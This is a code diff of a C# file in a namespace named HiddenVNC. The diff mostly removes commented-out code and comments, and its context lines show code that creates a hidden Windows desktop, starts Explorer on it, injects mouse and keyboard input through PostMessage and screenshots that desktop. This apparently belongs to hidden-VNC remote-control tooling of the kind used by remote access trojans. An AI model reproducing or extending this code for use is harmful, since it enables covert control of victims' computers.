@@ -134,8 +134,6 @@ namespace HiddenVNC
                     temp = CreateDesktop(_desktopName, IntPtr.Zero, IntPtr.Zero, 0, (UInt32)DESKTOP_ACCESS.GENERIC_ALL, IntPtr.Zero);
                 }
                 _hwndDesktop = temp;
-
-                //SetThreadDesktop(_hwndDesktop);
                 StartExplorer();
                 _scalingFactor = GetScalingFactor();
                 _desktopSize = GetDesktopBounds();
@@ -180,12 +178,6 @@ namespace HiddenVNC
         private const int WM_CHAR = 0x0102;
         private const int VK_BACK = 0x08;
         private const int VK_RETURN = 0x0D;
-
-
-
-
-
-
 
         public enum MouseButton
         {
@@ -233,9 +225,6 @@ namespace HiddenVNC
         {
             return (IntPtr)((delta << 16) | (0 & 0xFFFF));
         }
-
-
-
 
         bool adjustingWindow = false;
         POINT? lastMousePoint;
@@ -400,23 +389,6 @@ namespace HiddenVNC
                             int height = wr.Bottom - wr.Top;
                             if (mi.button == MouseButton.Left)
                             {
-                                //StringBuilder parentName = new StringBuilder();
-                                //GetWindowText(hWnd, parentName, 100);
-                                //Debug.WriteLine(parentName.ToString());
-                                //IntPtr test = ChildWindowFromPoint(hWnd, clientPoint);
-
-                                //StringBuilder childName = new StringBuilder();
-                                //GetWindowText(test, childName, 100);
-                                //Debug.WriteLine(childName.ToString());
-
-
-                                //POINT childP = new POINT();
-                                //ScreenToClient(test, ref childP);
-                                //PostMessage(hWnd, WM_LBUTTONDOWN, IntPtr.Zero, CordinatesMakeLParam(30,40));
-                                //Task.Delay(20).Wait();
-                                //PostMessage(hWnd, WM_LBUTTONUP, IntPtr.Zero, CordinatesMakeLParam(30, 40));
-
-
                                 PostMessage(hWnd, WM_LBUTTONDOWN, IntPtr.Zero, lParam);
                                 if (nchHitTestResult == HTCAPTION || nchHitTestResult == HTLEFT || nchHitTestResult == HTRIGHT || nchHitTestResult == HTBOTTOM || nchHitTestResult == HTTOPLEFT || nchHitTestResult == HTTOPRIGHT)
                                 {
@@ -445,21 +417,12 @@ namespace HiddenVNC
         private IntPtr BuildKeyParameter(int repeatCount, int scanCode, bool isExtendedKey, bool contextCode, bool previousKeyState, bool transitionState)
         {
 
-            int lParam = repeatCount & 0xFFFF; // Bits 0-15: repeat count
-
-            lParam |= (scanCode & 0xFF) << 16; // Bits 16-23: scan code
-
-            // Set the extended key flag in lParam.
-            // isExtendedKey indicates whether the key is an extended key (such as the right-hand ALT and CTRL keys).
-            // It occupies bit 24. If isExtendedKey is true, bit 24 is set to 1; otherwise, it remains 0.
-            lParam |= (isExtendedKey ? 1 : 0) << 24; // Bit 24: extended key flag
-
-            // Bits 25-28 are reserved and not used, so we skip setting them.
-
-
-            lParam |= (contextCode ? 1 : 0) << 29; // Bit 29: context code
-            lParam |= (previousKeyState ? 1 : 0) << 30; // Bit 30: previous key state
-            lParam |= (transitionState ? 1 : 0) << 31; // Bit 31: transition state
+            int lParam = repeatCount & 0xFFFF;
+            lParam |= (scanCode & 0xFF) << 16;
+            lParam |= (isExtendedKey ? 1 : 0) << 24;
+            lParam |= (contextCode ? 1 : 0) << 29;
+            lParam |= (previousKeyState ? 1 : 0) << 30;
+            lParam |= (transitionState ? 1 : 0) << 31;
             return new IntPtr(lParam);
 
 
@@ -485,7 +448,7 @@ namespace HiddenVNC
 
                     short vKey = VkKeyScanA(keyChar);
                     IntPtr wParam = (IntPtr)((int)vKey & 0xFFFF);
-                    int scanCode = MapVirtualKey((uint)(vKey & 0xFF), 0); // Map virtual key to scan code
+                    int scanCode = MapVirtualKey((uint)(vKey & 0xFF), 0);
 
                     SetThreadDesktop(_hwndDesktop);
 
@@ -506,11 +469,6 @@ namespace HiddenVNC
                                 PostMessage(hWnd, WM_KEYUP, VK_RETURN, IntPtr.Zero);
                                 return;
                             }
-                            //else if(keyChar == '\u0001')
-                            //{
-
-                            //}
-
 
                             PostMessage(hWnd, WM_KEYUP, wParam, lParamKeyUp);
                             break;
@@ -529,12 +487,6 @@ namespace HiddenVNC
                                 PostMessage(hWnd, WM_KEYDOWN, VK_RETURN, IntPtr.Zero);
                                 return;
                             }
-                            //else if (keyChar == '\u0001')
-                            //{
-                            //    PostMessage(hWnd, WM_KEYDOWN, VK_RETURN, IntPtr.Zero);
-                            //    return;
-                            //}
-
 
                             PostMessage(hWnd, WM_CHAR, (IntPtr)keyChar, lParamKeyDown);
                             break;
@@ -608,69 +560,6 @@ namespace HiddenVNC
         }
 
         private readonly object _lock = new object();
-        //private List<IntPtr> RetrieveAllWindowsInZOrder()
-        //{
-        //    bool result;
-        //    result = SetThreadDesktop(_hwndDesktop);
-
-        //    List<IntPtr> windows = new List<IntPtr>();
-        //    void AddNextWindowInZOrder(IntPtr hWnd)
-        //    {
-        //        IntPtr nextHWnd = GetWindow(hWnd, (uint)GetWindowType.GW_HWNDNEXT);
-        //        if (nextHWnd != IntPtr.Zero)
-        //        {
-
-        //            windows.Add(nextHWnd);
-        //            AddNextWindowInZOrder(nextHWnd);
-        //        }
-        //    }
-
-        //    IntPtr firstHWnd = GetTopWindow(IntPtr.Zero);
-        //    if (firstHWnd != IntPtr.Zero)
-        //    {
-        //        windows.Add(firstHWnd);
-        //        AddNextWindowInZOrder(firstHWnd);
-        //    }
-
-        //    return windows;
-        //}
-
-        //private async Task<Bitmap> CreateScreenShootFromHiddenDesktop()
-        //{
-        //    List<IntPtr> windows = RetrieveAllWindowsInZOrder();
-
-        //    for (int i = windows.Count - 1; i > 0; i--)
-        //    {
-        //        if (!IsWindowVisible(windows[i]))
-        //            continue;
-
-        //        await CaptureWindow(windows[i]);
-        //    }
-
-
-        //    return (Bitmap)_bmp.Clone();
-
-        //}
-        //private async Task CaptureWindow(IntPtr hWnd)
-        //{
-        //    SetThreadDesktop(_hwndDesktop);
-        //    RECT rect;
-        //    GetWindowRect(hWnd, out rect);
-        //    IntPtr tempDC = CreateCompatibleDC(_dc);
-        //    IntPtr tempBMP = CreateCompatibleBitmap(_dc, (int)((rect.Right - rect.Left) * _scalingFactor), (int)((rect.Bottom - rect.Top) * _scalingFactor));
-        //    SelectObject(tempDC, tempBMP);
-        //    bool result = PrintWindow(hWnd, tempDC, 2);
-        //    Bitmap processBmp = Bitmap.FromHbitmap(tempBMP);
-        //    _desktopGraphics.DrawImage(processBmp, new System.Drawing.Point((int)(rect.Left * _scalingFactor), (int)(rect.Top * _scalingFactor)));
-        //    DeleteObject(tempBMP);
-        //    ReleaseDC(IntPtr.Zero, tempDC);
-        //    DeleteDC(tempDC);
-        //    processBmp.Dispose();
-        //}
-
-
-
-        //__________________
 
         private readonly object gdiLock = new();
         private async Task<Bitmap> CreateScreenShootFromHiddenDesktop()
